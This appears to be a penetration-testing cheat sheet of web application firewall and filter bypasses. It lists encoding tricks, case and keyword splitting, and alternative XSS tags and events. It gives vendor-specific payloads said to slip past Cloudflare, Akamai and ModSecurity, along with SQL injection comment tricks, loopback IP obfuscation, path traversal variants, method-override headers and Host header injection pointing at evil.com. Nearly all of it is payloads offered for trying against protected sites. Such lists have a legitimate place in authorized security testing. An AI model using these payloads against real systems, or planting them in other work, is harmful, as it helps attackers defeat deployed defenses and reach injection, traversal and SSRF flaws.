# Bypasses

WAF evasion, filter bypass, and encoding tricks.

## General Encoding

### URL Encoding

```
< = %3C
> = %3E
" = %22
' = %27
/ = %2F
\ = %5C
```

### Double URL Encoding

```
< = %253C
> = %253E
```

### Unicode Encoding

```
< = \u003c
> = \u003e
< = %u003c
```

### HTML Entities

```
< = &lt;
> = &gt;
" = &quot;
' = &#39;
' = &#x27;
```

### Overlong UTF-8

```
< = %c0%bc
> = %c0%be
```

## Case Manipulation

```html
<ScRiPt>
<SCRIPT>
<scRipt>
```

## Space Alternatives

```
%09 (tab)
%0a (newline)
%0d (carriage return)
%0c (form feed)
/ (in tags: <svg/onload>)
/**/ (in SQL/JS)
```

## Null Bytes

```
%00
\0
```

## WAF-Specific Bypasses

### Cloudflare

```html
<svg onload=alert(1)> <!-- Often blocked -->
<details open ontoggle=alert(1)> <!-- Try this -->
<svg/onload=location='javascript:alert(1)'>
```

### Akamai

```html
<img src=x onerror=alert(1)> <!-- Blocked -->
<img src=x onerror=prompt(1)> <!-- Try -->
<img src=x onerror=confirm(1)>
```

### ModSecurity

```sql
' OR 1=1-- <!-- Blocked -->
' /*!50000OR*/ 1=1-- <!-- Try -->
```

## Keyword Bypass

### Splitting Keywords

```html
<scr<script>ipt>
<scr%00ipt>
```

### Alternative Tags

```html
<script> blocked? Try:
<svg onload=...>
<body onload=...>
<img src=x onerror=...>
<input onfocus=... autofocus>
<marquee onstart=...>
<video><source onerror=...>
<details open ontoggle=...>
```

### Alternative Events

```
onclick
ondblclick
onmouseover
onmouseenter
onfocus
onblur
onerror
onload
onanimationend
ontransitionend
```

## IP Address Obfuscation

```
127.0.0.1 = 2130706433 (decimal)
127.0.0.1 = 0x7f000001 (hex)
127.0.0.1 = 0177.0.0.1 (octal)
127.0.0.1 = 127.1
127.0.0.1 = 127.0.1
```

## Path Traversal Bypass

```
../
..\/
....//
..;/
..%2f
%2e%2e%2f
%252e%252e%252f
..%c0%af
..%ef%bc%8f
```

## Content-Type Tricks

```
application/json → application/x-www-form-urlencoded
application/xml → text/xml
```

## HTTP Method Override

```
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
X-HTTP-Method: PUT
```

## Host Header Tricks

```
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
Host: evil.com
Host: target.com@evil.com
Host: target.com%00.evil.com
```

---

!!! tip "Test systematically"
    Don't just try random bypasses. Understand what the WAF blocks, then find the specific bypass.
